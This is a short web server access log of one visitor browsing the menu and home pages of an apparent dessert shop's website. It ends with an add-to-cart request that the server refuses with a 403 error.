142.179.59.145 - - [08/May/2024:04:07:45 +0000] "GET /menu HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:07:45 +0000] "GET /menu/ HTTP/1.1" 200 1606 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:07:46 +0000] "GET / HTTP/1.1" 200 844 "https://www.deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:07:48 +0000] "GET /menu.html HTTP/1.1" 404 159 "https://www.deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:08:24 +0000] "GET /menu/ HTTP/1.1" 200 1602 "https://www.deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:08:27 +0000] "GET / HTTP/1.1" 200 844 "https://www.deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:08:54 +0000] "GET /menu/ HTTP/1.1" 200 1604 "https://www.deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
142.179.59.145 - - [08/May/2024:04:08:58 +0000] "POST /add_to_cart/ HTTP/1.1" 403 570 "https://www.deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
